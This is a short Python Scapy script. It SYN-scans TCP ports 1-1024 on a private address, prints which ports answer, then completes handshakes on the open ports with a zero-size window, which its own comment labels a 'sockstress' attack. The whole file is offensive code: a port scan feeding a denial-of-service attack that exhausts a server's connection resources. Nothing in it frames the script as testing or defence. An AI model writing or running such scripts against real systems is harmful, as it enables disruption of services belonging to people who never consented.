from scapy.all import * 
#scan TCP ports 1-1023 (you can enter a list of ports instead)
ans,unans = sr(IP(dst='192.168.1.1')/TCP(sport=RandShort(), dport=(1,1024)))
#print all the RA responses
for pkt in ans:
	if pkt[1][TCP].flags == 'RA':
		print("RA:",pkt[1].sport)
#print all the SA responses
for pkt in ans:
	if pkt[1][TCP].flags == 'SA':
		print("SA:",pkt[1].sport)
#list of packets
new=[]
#three way handshake all the open TCP ports
for pkt in ans:
	ack1=pkt[0]
	pktans=pkt[1]
	if pkt[1][TCP].flags == 'SA':
		ack1[TCP].seq=pktans.ack
		ack1[TCP].ack=pktans.seq +1
		ack1[TCP].flags='A'
		#to make it sockstress
		ack1.window=0
		new.append(ack1)
sendp(new)
for item in new:
	print(item.show())